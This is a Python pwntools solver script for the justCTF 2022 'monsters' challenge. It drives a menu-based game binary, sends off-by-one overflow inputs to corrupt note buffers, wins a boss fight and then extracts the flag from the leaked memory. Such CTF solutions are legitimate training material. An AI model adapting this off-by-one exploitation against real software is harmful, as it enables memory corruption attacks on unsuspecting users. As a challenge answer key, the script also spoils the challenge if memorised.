#!/usr/bin/env python3
from pwn import *
from enum import Enum

'''
justCTF2022
~ Tacet
'''

STR_SIZE = 24
FLAG_SIZE = 21

class Decision(Enum):
    START = 0
    CITY = 1
    DREAM_START = 9
    DREAM_KIND = 14
    DREAM_NOTE = 15
    BOSS_VISIT = 16
    BOSS_COPY = 18
    BOSS_FIGHT = 19
    MONSTER_NOTE = 20
    NEXT_LEVEL = 21
    QUEEN_PET = 22
    QUEEN_TALK = 23
    QUEEN_NOTE = 24

def get_connection():
    if args.PROCESS:
        return process("monsters")

    host = args.HOST
    port = int(args.PORT)
    return remote(host, port)

def step(con, choice, verbose=False):
    # print("Sending: ", choice, " - ", choice.value)

    con.sendline(str(choice.value).encode())
    msg = con.read()

    if verbose:
        print(msg)

    return msg

def start(con):
    step(con, Decision.START)
    step(con, Decision.CITY)

def off_by_one(con, value):
    con.sendline(value * STR_SIZE)

def note_exploit(con, value):
    step(con, Decision.MONSTER_NOTE)
    off_by_one(con, value)

def copy_monser(con):
    step(con, Decision.BOSS_COPY)

def copy_buffer(con):
    step(con, Decision.BOSS_VISIT)
    note_exploit(con, b'"')
    copy_monser(con)
    note_exploit(con, b"1")
    step(con, Decision.CITY)

def fix_buffer_access(con):
    step(con, Decision.DREAM_NOTE)
    off_by_one(con, b"1")
    step(con, Decision.DREAM_START)

def update_buffer_content(con):
    step(con, Decision.DREAM_START)
    fix_buffer_access(con)
    step(con, Decision.DREAM_KIND)
    con.sendline(b"VeryBadKind!")
    step(con, Decision.CITY)

def win_fight(con):
    step(con, Decision.BOSS_VISIT)
    step(con, Decision.BOSS_FIGHT)

def unlock_note(con):
    step(con, Decision.QUEEN_TALK)

def get_flag(con):
    unlock_note(con)
    step(con, Decision.QUEEN_NOTE)
    off_by_one(con, b'|')
    #off_by_one(con, b'0')
    return step(con, Decision.QUEEN_PET, verbose=False)

def solv(con):
    start(con)
    copy_buffer(con)
    update_buffer_content(con)
    win_fight(con)
    step(con, Decision.NEXT_LEVEL)
    flag_dump = get_flag(con)

    # Hack for not ideal solver script, heh
    flag_dump += con.read(50000)

    idx = flag_dump.find(b"N50RE")
    print('>>>',flag_dump)
    flag = b"justCTF{" + flag_dump[idx+6:]
    print(flag[:FLAG_SIZE].decode())


if __name__ == "__main__":
    con = get_connection()
    solv(con)
    con.close()
